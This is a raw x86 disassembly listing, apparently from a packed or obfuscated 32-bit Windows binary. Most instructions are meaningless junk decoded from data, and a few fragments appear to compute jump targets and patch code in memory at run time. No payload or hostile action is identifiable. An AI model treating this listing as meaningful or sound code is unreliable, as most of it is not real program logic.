  402886:	ucomiss xmm1,DWORD PTR [esi+edi*2]
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x40288e
  402890:	mov    dl,0x11
  402892:	mov    ebp,0xecbbec1
  402897:	dec    ecx
  402898:	cmp    DWORD PTR [ecx+0x55],ebp
  40289b:	out    0x11,eax
  40289d:	sub    al,BYTE PTR [eax-0x60d9811a]
  4028a3:	sahf   
  4028a4:	mov    edi,DWORD PTR [eax+0x37099fad]
  4028aa:	fistp  QWORD PTR [edi-0x20]
  4028ad:	sar    DWORD PTR [esi],0xd6
  4028b0:	shl    DWORD PTR [edx-0xb81a634],1
  4028b6:	or     eax,0x665a9ee2
  4028bb:	popa   
  4028bc:	jns    0x402886
  4028be:	inc    ebp
  4028bf:	inc    ebp
  4028c0:	mov    dl,0x6
  4028c2:	outs   dx,BYTE PTR ds:[esi]
  4028c3:	mov    eax,0x4b7dc0bb
  4028c8:	jecxz  0x402922
  4028ca:	cmp    ecx,0xfe482161
  4028d0:	mov    ds:0x617ea761,al
  4028d5:	popa   
  4028d6:	scas   eax,DWORD PTR es:[edi]
  4028d7:	leave  
  4028d8:	in     eax,dx
  4028d9:	cmp    DWORD PTR [eax],edi
  4028db:	mov    cr2,esi
  4028de:	hlt    
  4028df:	inc    ebx
  4028e0:	cld    
  4028e1:	mov    ds:0x422c1ffe,al
  4028e6:	scas   al,BYTE PTR es:[edi]
  4028e7:	cld    
  4028e8:	mov    eax,0x239d30b5
  4028ed:	mov    dl,0xc
  4028ef:	inc    ecx
  4028f0:	aam    0x1e
  4028f2:	lds    esp,FWORD PTR [edx]
  4028f4:	mov    edi,0x9bff8ffc
  4028f9:	stos   BYTE PTR es:[edi],al
  4028fa:	imul   eax,DWORD PTR [ecx-0x6ea76c00],0x3a
  402901:	push   esi
  402902:	pop    edx
  402903:	inc    ebx
  402904:	fcmove st,st(2)
  402906:	popa   
  402907:	push   esp
  402908:	jg     0x402963
  40290a:	fwait
  40290b:	xor    eax,0x97b7cb8e
  402910:	xchg   esp,eax
  402911:	pop    esp
  402912:	sub    BYTE PTR [ebp+0x72],cl
  402915:	imul   DWORD PTR [eax+0x3fb79a55]
  40291b:	outs   dx,DWORD PTR ds:[esi]
  40291c:	enter  0x6172,0xc2
  402920:	pop    esp
  402921:	pop    esp
  402922:	add    al,0xb6
  402924:	sbb    DWORD PTR [edx-0x69410248],ecx
  40292a:	outs   dx,DWORD PTR ds:[esi]
  40292b:	mov    WORD PTR [ebx-0x179b0e87],cs
  402931:	fidivr WORD PTR [edx-0x5fd8b2dd]
  402937:	aaa    
  402938:	repz rcr BYTE PTR [eax+0x6ce50075],cl
  40293f:	out    dx,eax
  402940:	jecxz  0x4029a8
  402942:	or     dl,BYTE PTR [eax]
  402944:	(bad)  
  402946:	sbb    eax,0x9a8eb781
  40294b:	mov    cl,0x92
  40294d:	xchg   esp,eax
  40294e:	out    0x25,al
  402950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402951:	lahf   
  402952:	in     eax,dx
  402953:	mov    ebx,0xcce992fe
  402958:	inc    ebp
  402959:	ret    0xa69b
  40295c:	test   BYTE PTR [ecx-0x7e],dl
  40295f:	inc    esi
  402960:	in     al,0xb2
  402962:	fs push 0x27
  402965:	mov    ecx,0x3edd91b2
  40296a:	dec    esi
  40296b:	sti    
  40296c:	mov    esi,0x91c980c
  402971:	adc    bl,BYTE PTR [ecx]
  402973:	xlat   BYTE PTR ds:[ebx]
  402974:	icebp  
  402975:	mov    ch,0x9d
  402977:	(bad)  
  402978:	retf   
  402979:	outs   dx,BYTE PTR ds:[esi]
  40297a:	(bad)  
  40297b:	ffreep st(6)
  40297d:	iret   
  40297e:	add    eax,0x8e0cc821
  402983:	scas   eax,DWORD PTR es:[edi]
  402984:	aam    0xda
  402986:	je     0x4029ac
  402988:	pop    ecx
  402989:	adc    al,0x8e
  40298b:	mov    bh,BYTE PTR [eax-0x60]
  40298e:	ss int3 
  402990:	adc    cl,BYTE PTR [edi+edx*8+0x3ecaa13b]
  402997:	js     0x4029fd
  402999:	ds cld 
  40299b:	adc    BYTE PTR [ebp-0x60],bh
  40299e:	dec    ebp
  40299f:	in     eax,dx
  4029a0:	or     bl,BYTE PTR ds:0xb748bcef
  4029a6:	xchg   BYTE PTR [edi],ch
  4029a8:	scas   ax,WORD PTR es:[edi]
  4029aa:	jmp    FWORD PTR gs:[edi-0x1a310b62]
  4029b1:	gs pop eax
  4029b3:	mov    dh,BYTE PTR [edx]
  4029b5:	loopne 0x4029da
  4029b7:	test   BYTE PTR gs:[edx],0xb0
  4029bb:	push   ebp
  4029bc:	pop    ecx
  4029bd:	push   cs
  4029be:	ja     0x402a2d
  4029c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c1:	cwde   
  4029c2:	inc    esp
  4029c3:	push   esi
  4029c4:	test   al,0x79
  4029c6:	enter  0x9d16,0xb1
  4029ca:	pusha  
  4029cb:	(bad)  
  4029cc:	ds popf 
  4029ce:	inc    ebx
  4029d0:	cmp    DWORD PTR ds:0x5af99891,0x4abf1b04
  4029da:	push   ds
  4029db:	fdiv   DWORD PTR [edx-0x76]
  4029de:	aad    0x26
  4029e0:	je     0x4029cb
  4029e2:	lahf   
  4029e3:	dec    ecx
  4029e4:	pop    ss
  4029e5:	clc    
  4029e6:	pmuludq mm4,QWORD PTR [edx+edx*8]
  4029ea:	jo     0x4029d2
  4029ec:	lea    ecx,[edx+0x28464bba]
  4029f2:	jge    0x402a62
  4029f4:	pop    ds
  4029f5:	pusha  
  4029f6:	jg     0x4029fb
  4029f8:	cli    
  4029f9:	or     bl,BYTE PTR [ebp+0x45]
  4029fc:	add    eax,0x4de75d75
  402a01:	ds xchg ebp,eax
  402a03:	pop    edx
  402a04:	shl    DWORD PTR [ecx-0x25853970],cl
  402a0a:	das    
  402a0b:	das    
  402a0c:	in     eax,dx
  402a0d:	mov    ds:0xba95c836,eax
  402a12:	into   
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	pop    ds
  402a35:	and    eax,0xdaafdb2
  402a3a:	jle    0x402aba
  402a3c:	cli    
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402a42
  402a41:	or     DWORD PTR [edx+0x304a5901],ebp
  402a47:	xchg   ebp,eax
  402a48:	add    eax,0x12164afc
  402a4d:	push   0xf69051d5
  402a52:	fld    DWORD PTR [ecx+esi*8+0x36f46f53]
  402a59:	ins    BYTE PTR es:[edi],dx
  402a5a:	ins    BYTE PTR es:[edi],dx
  402a5b:	add    cl,cl
  402a5d:	mov    ah,0x9b
  402a5f:	inc    edi
  402a60:	cmc    
  402a61:	mov    ecx,0xd7df18f9
  402a66:	or     ch,0xa2
  402a69:	test   edx,eax
  402a6b:	pop    ecx
  402a6c:	sub    DWORD PTR [edx],ecx
  402a6e:	jbe    0x402a24
  402a70:	loopne 0x402a52
  402a72:	dec    ebp
  402a73:	idiv   DWORD PTR [esp+edx*1]
  402a76:	test   DWORD PTR [esi-0x14105ac7],ebx
  402a7c:	idiv   edx
  402a7e:	test   eax,0xd7d3e344
  402a83:	arpl   WORD PTR [ebx-0x445b0a7a],ax
  402a89:	ret    0xb6f7
  402a8c:	pop    ds
  402a8d:	mov    ch,0x1f
  402a8f:	sahf   
  402a90:	cmp    cl,BYTE PTR [edi+esi*1]
  402a93:	sub    eax,DWORD PTR ds:0xb602b64f
  402a99:	rol    ebp,cl
  402a9b:	(bad)  
  402a9c:	add    DWORD PTR [esi-0x1894ec35],edx
  402aa2:	sbb    bl,BYTE PTR [ebx+edi*4+0x5a]
  402aa6:	xor    BYTE PTR [ecx],al
  402aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aa9:	or     eax,0x1e6f96a3
  402aae:	stos   BYTE PTR es:[edi],al
  402aaf:	dec    ecx
  402ab0:	je     0x402b0d
  402ab2:	imul   eax,DWORD PTR [ecx],0x4ca06e9f
  402ab8:	test   al,0x28
  402aba:	outs   dx,BYTE PTR ds:[esi]
  402abb:	ret    
  402abc:	daa    
  402abd:	aas    
  402abe:	in     al,dx
  402abf:	ins    BYTE PTR es:[edi],dx
  402ac0:	xor    eax,0xa7a86e6b
  402ac5:	sahf   
  402ac6:	mov    al,0x1a
  402ac8:	add    DWORD PTR [esp+esi*4+0x431f703b],eax
  402acf:	imul   esp,DWORD PTR [edx],0x17
  402ad2:	xchg   esp,eax
  402ad3:	les    ebp,FWORD PTR [esi+0x58]
  402ad6:	loopne 0x402a8b
  402ad8:	pop    es
  402ad9:	push   esp
  402ada:	daa    
  402adb:	xchg   edx,eax
  402adc:	mov    BYTE PTR [edx+0x53],bl
  402adf:	adc    BYTE PTR [edi+0x3b],bl
  402ae2:	jmp    0x402a71
  402ae4:	rol    WORD PTR [edi+ecx*2],1
  402ae8:	daa    
  402ae9:	push   0xffffff93
  402aeb:	pop    ss
  402aec:	cli    
  402aed:	(bad)  
  402aef:	jl     0x402abf
  402af1:	push   ss
  402af2:	sbb    DWORD PTR [ecx+0x2e644ac7],0xffffff86
  402af9:	or     bl,BYTE PTR [ebx+0x3e5f4aea]
  402aff:	sub    bl,BYTE PTR [eax-0x28]
  402b02:	xor    DWORD PTR [ebx],esp
  402b04:	pop    es
  402b05:	dec    edx
  402b06:	clc    
  402b07:	stos   BYTE PTR es:[edi],al
  402b08:	sbb    ah,BYTE PTR [esi+eax*8-0x3e]
  402b0c:	mov    esi,0x66c68c7e
  402b11:	mov    bl,BYTE PTR [edx-0x20c7adc1]
  402b17:	adc    DWORD PTR [edi],esi
  402b19:	pusha  
  402b1a:	loope  0x402b74
  402b1c:	jmp    esp
  402b1e:	jmp    0x53d6:0x4a4521e
  402b25:	sbb    al,0xef
  402b27:	jnp    0x402b12
  402b29:	or     edx,DWORD PTR [eax-0x50]
  402b2c:	popf   
  402b2d:	int3   
  402b2e:	sub    ebx,0xa12caa
  402b34:	jmp    0xf149c31a
  402b39:	imul   DWORD PTR [eax+0x26]
  402b3c:	jo     0x402b71
  402b3e:	mov    bh,0xcc
  402b40:	adc    BYTE PTR [ebx-0x10c68881],bh
  402b46:	in     eax,0x80
  402b48:	mov    dh,0x8f
  402b4a:	je     0x402b20
  402b4c:	test   al,0x42
  402b4e:	call   0xa6e2:0xb8b90c64
  402b55:	jae    0x402b4c
  402b57:	mov    ecx,0x12d66e
  402b5c:	out    0x53,eax
  402b5e:	stos   BYTE PTR es:[edi],al
  402b5f:	adc    DWORD PTR [edi-0x7e6fe574],ebx
  402b65:	cld    
  402b66:	cmp    al,0xc5
  402b68:	fs or  al,0x48
  402b6b:	mov    ss,WORD PTR [edi]
  402b6d:	mov    edi,0xb58b9f48
  402b72:	xor    BYTE PTR [ecx-0x68],0x68
  402b76:	ror    BYTE PTR [eax],0x37
  402b79:	mov    al,0xa9
  402b7b:	je     0x402ba3
  402b7d:	mov    eax,0x882f24cf
  402b82:	adc    DWORD PTR [eax+0x1cb7c36a],esi
  402b88:	test   DWORD PTR [edi],esp
  402b8a:	jae    0x402bcd
  402b8c:	mov    edi,0x3c215cdd
  402b91:	push   edi
  402b92:	in     al,dx
  402b93:	call   0x7e3:0xc5275301
  402b9a:	ffree  st(3)
  402b9c:	dec    edi
  402b9d:	inc    edx
  402b9e:	inc    eax
  402b9f:	mov    esp,0xefe1a92e
  402ba4:	stc    
  402ba5:	and    bh,BYTE PTR [edx+0x117f5282]
  402bab:	scas   eax,DWORD PTR es:[edi]
  402bac:	leave  
  402bad:	lock dec esi
  402baf:	lahf   
  402bb0:	cmp    DWORD PTR ds:0x5d2e8b59,0x331155db
  402bba:	pop    ecx
  402bbb:	add    bl,0xa0
  402bbe:	pop    ebx
  402bbf:	fnclex 
  402bc1:	out    0xb,eax
  402bc3:	aas    
  402bc4:	test   eax,eax
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	mov    ebx,0x3641320b
  402c16:	or     edi,DWORD PTR [esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c0e
  402c1e:	cmp    BYTE PTR [edi],al
  402c20:	ret    
  402c21:	mov    eax,ds:0xc3170ff5
  402c26:	std    
  402c27:	ret    0x1421
  402c2a:	out    dx,al
  402c2b:	imul   ecx,DWORD PTR [edx-0x29d37f08],0xbac502b7
  402c35:	mov    ecx,0x877a04
  402c3a:	arpl   WORD PTR [ecx-0x2e],bx
  402c3d:	sbb    edx,0x36
  402c40:	pop    esp
  402c41:	or     eax,0xb0f963ea
  402c46:	dec    ebx
  402c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c48:	(bad)  
  402c49:	das    
  402c4a:	push   cs
  402c4b:	sub    DWORD PTR [ecx-0x28259e20],ebp
  402c51:	push   ebx
  402c52:	addr16 xchg edi,eax
  402c54:	push   es
  402c55:	shl    DWORD PTR [esi],1
  402c57:	cwde   
  402c58:	jno    0x402c61
  402c5a:	pop    ebx
  402c5b:	jle    0x402c00
  402c5d:	jnp    0x402c19
  402c5f:	xor    bl,BYTE PTR [eax+0x4a28e72a]
  402c65:	lock jl 0x402c59
  402c68:	arpl   WORD PTR [eax],dx
  402c6a:	xchg   DWORD PTR [ecx+edi*8+0x40c1275],eax
  402c71:	mov    esp,0xb62076e5
  402c76:	into   
  402c77:	fld    DWORD PTR [eax+0x28]
  402c7a:	int    0x9c
  402c7c:	jp     0x402cd5
  402c7e:	mov    es,WORD PTR [eax+0x1c]
  402c81:	leave  
  402c82:	jb     0x402cde
  402c84:	test   al,0x4e
  402c86:	call   0xa4b8036c
  402c8b:	ss mov edi,0xe10080a6
  402c91:	xchg   BYTE PTR [esi+0x8],ch
  402c94:	adc    BYTE PTR [ebx],cl
  402c96:	ins    DWORD PTR es:[edi],dx
  402c97:	push   ecx
  402c98:	mov    dh,0xe8
  402c9a:	pop    ebp
  402c9b:	mov    ecx,DWORD PTR [eax+0x2adfc67]
  402ca1:	mov    ah,0x3c
  402ca3:	jmp    0x3a9c:0xaf650905
  402caa:	mov    al,0x99
  402cac:	jle    0x402cf1
  402cae:	repz and BYTE PTR [ebx],0xa7
  402cb2:	outs   dx,BYTE PTR ds:[esi]
  402cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cb4:	bound  ecx,QWORD PTR [edi-0x75]
  402cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cb8:	bound  esp,QWORD PTR [eax+0x3c984797]
  402cbe:	cmp    ch,ah
  402cc0:	inc    ecx
  402cc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cc2:	mov    ss,WORD PTR [esi+0x20f477a9]
  402cc8:	jbe    0x402d10
  402cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ccb:	es dec eax
  402ccd:	es mov dh,0x28
  402cd0:	jle    0x402d01
  402cd2:	and    DWORD PTR [ebx+0x1f2645a9],eax
  402cd8:	inc    edi
  402cd9:	or     al,0x37
  402cdb:	pusha  
  402cdc:	jae    0x402c98
  402cde:	add    al,0x6f
  402ce0:	cmp    ah,BYTE PTR [ecx+0x25]
  402ce3:	sbb    eax,0x8bc3e993
  402ce8:	aas    
  402ce9:	push   edx
  402cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ceb:	sbb    DWORD PTR [ebx+0x21],0x2413867c
  402cf2:	test   DWORD PTR [edi],0x20b358bf
  402cf8:	out    dx,eax
  402cf9:	dec    esi
  402cfa:	adc    eax,0xed036d8e
  402cff:	gs loopne 0x402d12
  402d02:	stc    
  402d03:	fmul   QWORD PTR [esi-0x52e36821]
  402d09:	arpl   di,si
  402d0b:	lods   al,BYTE PTR ds:[esi]
  402d0c:	inc    esp
  402d0d:	clc    
  402d0e:	lods   al,BYTE PTR ds:[esi]
  402d0f:	(bad)  
  402d10:	xchg   esi,eax
  402d11:	mov    cl,0x75
  402d13:	xor    bl,ah
  402d15:	xor    eax,0x18259373
  402d1a:	(bad)  
  402d1b:	jno    0x402d6c
  402d1d:	push   edx
  402d1e:	loop   0x402cb2
  402d20:	js     0x402ce9
  402d22:	test   eax,0x7301bfea
  402d27:	dec    esp
  402d28:	xchg   ecx,eax
  402d29:	retf   
  402d2a:	imul   ebp,DWORD PTR [edx+esi*2+0x567ded9e],0x62040b69
  402d35:	call   0x6c73:0xa232841e
  402d3c:	dec    edi
  402d3d:	outs   dx,DWORD PTR ds:[esi]
  402d3e:	pop    esi
  402d3f:	cdq    
  402d40:	lods   eax,DWORD PTR gs:[esi]
  402d42:	loope  0x402cf6
  402d44:	jmp    0x402d65
  402d46:	sti    
  402d47:	addr16 mov dh,0x29
  402d4a:	daa    
  402d4b:	outs   dx,BYTE PTR ds:[esi]
  402d4c:	lahf   
  402d4d:	cwde   
  402d4e:	arpl   di,cx
  402d50:	jo     0x402d64
  402d52:	cld    
  402d53:	ret    
  402d54:	popf   
  402d55:	sub    al,0xff
  402d57:	jmp    0xbcec5235
  402d5c:	mov    bh,BYTE PTR [ecx-0x4c]
  402d5f:	pop    es
  402d60:	mov    DWORD PTR [edi+ebp*2+0x2b],0x7e9f4ae9
  402d68:	repnz in eax,dx
  402d6a:	rol    DWORD PTR [ebp-0x5626205f],0xa8
  402d71:	push   ds
  402d72:	in     al,0x4f
  402d74:	sbb    ah,ah
  402d76:	cld    
  402d77:	mov    eax,ds:0xf9677567
  402d7c:	push   cs
  402d7d:	lock nop
  402d7f:	xor    al,0x9
  402d81:	sbb    al,0xb5
  402d83:	sub    al,0x66
  402d85:	cmp    BYTE PTR [esi-0x66],0x6f
  402d89:	sbb    ebp,DWORD PTR [edx]
  402d8b:	mov    cl,0xb4
  402d8d:	leave  
  402d8e:	dec    esi
  402d8f:	mov    al,ds:0xd9c87125
  402d94:	out    0x67,al
  402d96:	push   ebp
  402d97:	scas   eax,DWORD PTR es:[edi]
  402d98:	cs cmp ah,ah
  402d9b:	mov    DWORD PTR [ebp-0x64],esp
  402d9e:	std    
  402d9f:	shl    edx,1
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ecx+edi*4-0x76],1
  402de7:	mov    ebp,ecx
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402d7e
  402df2:	add    al,0x94
  402df5:	cmc    
  402df6:	daa    
  402df7:	sbb    DWORD PTR [edx-0x56],0x8c0d740b
  402dfe:	aam    0x6
  402e00:	into   
  402e01:	jl     0x402e6e
  402e03:	cdq    
  402e04:	icebp  
  402e05:	add    dl,BYTE PTR [edi+0x6]
  402e08:	jae    0x402db4
  402e0a:	cmp    esi,esp
  402e0c:	sbb    edx,eax
  402e0e:	out    dx,eax
  402e0f:	in     al,dx
  402e10:	lds    edi,FWORD PTR [di+0x577]
  402e15:	fimul  WORD PTR ss:[esi+0x4223b6d]
  402e1c:	nop
  402e1d:	in     eax,0x74
  402e1f:	or     BYTE PTR [ecx],0x4c
  402e22:	(bad)  
  402e23:	fwait
  402e24:	mov    ebp,DWORD PTR [ecx+0x63]
  402e27:	daa    
  402e28:	enter  0x83e3,0xe
  402e2c:	loope  0x402e13
  402e2e:	mov    cl,0x52
  402e30:	arpl   WORD PTR [edx-0x7c],cx
  402e33:	pop    ecx
  402e34:	or     al,0x4a
  402e36:	jp     0x402e0d
  402e38:	push   cs
  402e39:	dec    ebp
  402e3a:	test   al,0x7b
  402e3c:	and    al,0x49
  402e3e:	popa   
  402e3f:	lods   al,BYTE PTR ds:[esi]
  402e40:	jmp    FWORD PTR [esi-0x29]
  402e43:	xchg   BYTE PTR ds:0xcd02959f,al
  402e49:	imul   esi,DWORD PTR [ebp+0x51],0xa7c50477
  402e50:	xor    BYTE PTR [ecx+0x44],bh
  402e53:	or     DWORD PTR [esp+eax*8],ebp
  402e56:	push   ebx
  402e57:	adc    al,0xcb
  402e59:	cdq    
  402e5a:	inc    esp
  402e5b:	push   ebx
  402e5c:	add    al,0x1e
  402e5e:	xchg   ebp,eax
  402e5f:	ds in  eax,0xd9
  402e62:	cmp    eax,0x35ea2e28
  402e67:	sbb    al,0x2a
  402e69:	ds add eax,0xf7f47801
  402e6f:	and    BYTE PTR [ecx],ah
  402e71:	fsubr  st,st(2)
  402e73:	(bad)  
  402e75:	inc    esi
  402e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e77:	sub    eax,0xd81ae98
  402e7c:	outs   dx,BYTE PTR ds:[esi]
  402e7d:	pop    es
  402e7e:	aas    
  402e7f:	add    eax,0xaae05451
  402e84:	outs   dx,DWORD PTR ds:[esi]
  402e85:	sbb    ch,dl
  402e87:	jp     0x402e46
  402e89:	mov    ds:0x3b862eca,al
  402e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e8f:	out    dx,eax
  402e90:	dec    ecx
  402e91:	(bad)  
  402e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e93:	mov    esp,0xb71951d2
  402e98:	dec    ebx
  402e99:	adc    al,0xf9
  402e9b:	jne    0x402e37
  402e9d:	inc    ecx
  402e9e:	and    al,0x5b
  402ea0:	xor    edx,edi
  402ea2:	rol    BYTE PTR [edx+0x6f],0x1a
  402ea6:	dec    esp
  402ea7:	mov    BYTE PTR [ecx],bh
  402ea9:	aaa    
  402eaa:	cmp    al,0xa
  402eac:	jbe    0x402e98
  402eae:	or     ch,BYTE PTR [eax+0x24f60208]
  402eb4:	mov    WORD PTR [ebx],?
  402eb6:	loop   0x402eaf
  402eb8:	mov    esp,0xb0cac0ee
  402ebd:	mov    dh,0xd1
  402ebf:	inc    ebx
  402ec0:	loop   0x402ef2
  402ec2:	sbb    BYTE PTR [edx+0x1adf662b],cl
  402ec8:	push   0xffffffce
  402eca:	pop    es
  402ecb:	sar    BYTE PTR [edx+ebp*1-0x3741170d],cl
  402ed2:	popf   
  402ed3:	fsub   DWORD PTR [esp+esi*1+0x278f980c]
  402eda:	shr    BYTE PTR [ebx-0x3ca59466],cl
  402ee0:	retf   0xd229
  402ee3:	inc    esi
  402ee4:	inc    ecx
  402ee5:	or     esi,DWORD PTR [ebx]
  402ee7:	sub    esi,eax
  402ee9:	mov    al,0x6
  402eeb:	push   esi
  402eec:	dec    edx
  402eed:	cmp    DWORD PTR [ebx],eax
  402eef:	mov    al,0x57
  402ef1:	mov    DWORD PTR [edi-0x5b],eax
  402ef4:	push   ds
  402ef5:	sbb    eax,0xb32802e6
  402efa:	iret   
  402efb:	xchg   edx,eax
  402efc:	outs   dx,DWORD PTR ds:[esi]
  402efd:	lahf   
  402efe:	out    0x85,al
  402f00:	xchg   edi,eax
  402f01:	adc    edi,DWORD PTR [ecx]
  402f03:	out    0xee,eax
  402f05:	dec    esi
  402f06:	dec    edx
  402f07:	adc    al,0xc1
  402f09:	pop    esp
  402f0a:	js     0x402ea7
  402f0c:	aas    
  402f0d:	clc    
  402f0e:	es sbb al,0x6a
  402f11:	out    0x12,eax
  402f13:	xchg   ebp,eax
  402f14:	add    al,0xd7
  402f16:	shr    BYTE PTR [ecx+0x7d],cl
  402f19:	dec    ebp
  402f1a:	mov    al,ds:0xb3791c19
  402f1f:	jg     0x402ef4
  402f21:	into   
  402f22:	mov    ecx,0xdf87bbf1
  402f27:	dec    esp
  402f28:	shl    edx,0xb7
  402f2b:	sbb    BYTE PTR ss:[ecx+0x7d739621],dl
  402f32:	dec    esi
  402f33:	cdq    
  402f34:	ins    BYTE PTR es:[edi],dx
  402f35:	mov    ebx,0x19e67d02
  402f3a:	sub    eax,0x692432f
  402f3f:	jg     0x402f9d
  402f41:	ret    0x3898
  402f44:	sbb    eax,0xcb657294
  402f49:	aaa    
  402f4a:	mov    WORD PTR [eax+ebx*2-0x17],fs
  402f4e:	repz das 
  402f50:	ins    BYTE PTR es:[edi],dx
  402f51:	inc    esp
  402f52:	sub    al,0x1d
  402f54:	out    dx,al
  402f55:	mov    ecx,0x2737cd22
  402f5a:	xor    ebx,edi
  402f5c:	cmp    eax,0xe91d52b4
  402f61:	ds lahf 
  402f63:	jl     0x402f17
  402f65:	cmp    esi,edx
  402f67:	fidiv  DWORD PTR [eax+0x7e7ea450]
  402f6d:	pop    es
  402f6e:	shl    ch,cl
  402f70:	xchg   edx,eax
  402f71:	and    ch,BYTE PTR [edx-0x4b]
  402f74:	inc    ebp
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x6d5f5a49]
  402fae:	xor    al,0xb
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f6e
  402fb9:	into   
  402fba:	mov    ds:0x273f6483,eax
  402fbf:	fidiv  DWORD PTR [eax-0x20]
  402fc2:	arpl   WORD PTR [esi+esi*8],bp
  402fc5:	iret   
  402fc6:	ins    BYTE PTR es:[edi],dx
  402fc7:	dec    eax
  402fc8:	inc    ebp
  402fc9:	mov    ebp,0xe04a4a39
  402fce:	mov    bh,0x9b
  402fd0:	lea    esp,[edx-0x357615ec]
  402fd6:	pop    edi
  402fd7:	mov    ds:0x4aa01545,eax
  402fdc:	dec    eax
  402fdd:	out    0x6a,al
  402fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fe0:	jle    0x402fc9
  402fe2:	inc    ebp
  402fe3:	inc    esp
  402fe4:	(bad)  
  402fe5:	stc    
  402fe6:	and    eax,0xd77198a8
  402feb:	cld    
  402fec:	ret    
  402fed:	in     al,0xd6
  402fef:	ret    0xdc80
  402ff2:	add    edi,eax
  402ff4:	fisubr DWORD PTR [ebx]
  402ff6:	test   al,0x8c
  402ff8:	rcr    BYTE PTR [edx+eiz*8],1
  402ffb:	loopne 0x40301f
  402ffd:	push   edx
  402ffe:	mov    WORD PTR [eax-0x675cabf2],gs
  403004:	pop    esi
  403005:	pusha  
  403006:	cwde   
  403007:	jmp    0xa13d6167
  40300c:	mov    esp,0xaa6af7c7
  403011:	inc    edx
  403012:	jbe    0x403026
  403014:	dec    edi
  403015:	inc    ebx
  403016:	out    0x55,al
  403018:	int3   
  403019:	lahf   
  40301a:	stc    
  40301b:	inc    ebp
  40301c:	mov    ah,0xfb
  40301e:	repz and dl,BYTE PTR [ebx+0x2]
  403022:	mov    bh,BYTE PTR [edi-0x76da872d]
  403028:	xor    eax,0x78edab73
  40302d:	xlat   BYTE PTR ds:[ebx]
  40302e:	(bad)  
  40302f:	push   ds
  403030:	fidiv  WORD PTR [ebp+0x47]
  403033:	jl     0x403095
  403035:	in     al,0x88
  403037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403038:	das    
  403039:	xchg   esi,eax
